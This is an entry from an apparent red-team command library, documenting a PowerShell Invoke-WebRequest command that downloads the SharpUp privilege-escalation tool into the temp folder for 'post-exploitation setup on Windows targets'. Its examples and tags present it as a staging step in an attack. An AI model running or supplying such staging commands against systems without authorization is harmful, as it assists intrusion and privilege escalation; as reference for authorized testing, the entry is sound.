---
id: 89fb504d-bae1-442f-a5c4-407e91a60b09
type: command
executor: powershell
data: >-
  Invoke-WebRequest -Uri
  'https://github.com/GhostPack/SharpUp/releases/latest/download/SharpUp.exe'
  -OutFile "$env:TEMP\SharpUp.exe"
output: null
created_at: '2023-01-01T00:00:00Z'
updated_at: '2023-01-01T00:00:00Z'
platforms:
  - Windows
tags:
  - download
  - staging
verified: true
validated: true
---

# download-sharpup

## Command

```powershell
Invoke-WebRequest -Uri 'https://github.com/GhostPack/SharpUp/releases/latest/download/SharpUp.exe' -OutFile "$env:TEMP\SharpUp.exe"
```

## Description

This command downloads the latest SharpUp.exe binary from the GhostPack GitHub releases directly to the system's temporary directory using PowerShell's Invoke-WebRequest. It stages the enumeration tool for privilege escalation checks without requiring external download tools, ideal for initial post-exploitation setup on Windows targets.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-Uri` | The URL of the SharpUp executable to download (points to latest release) | Yes |
| `-OutFile` | Path where the file will be saved (uses $env:TEMP for temporary directory) | Yes |

## Examples

### Basic Usage

```powershell
Invoke-WebRequest -Uri 'https://github.com/GhostPack/SharpUp/releases/latest/download/SharpUp.exe' -OutFile 'SharpUp.exe'
```

### Advanced Usage

```powershell
Invoke-WebRequest -Uri 'https://github.com/GhostPack/SharpUp/releases/latest/download/SharpUp.exe' -OutFile 'C:\Temp\SharpUp.exe' -UseBasicParsing
```

## Expected Output

No console output on success; the file is silently downloaded to the specified path. Verify success by checking the file existence:

```powershell
Test-Path "$env:TEMP\SharpUp.exe"
```
This should return True if downloaded successfully.

## Related

- [[tools/SharpUp]]
- [[commands/run-sharpup-privesc-scan]]
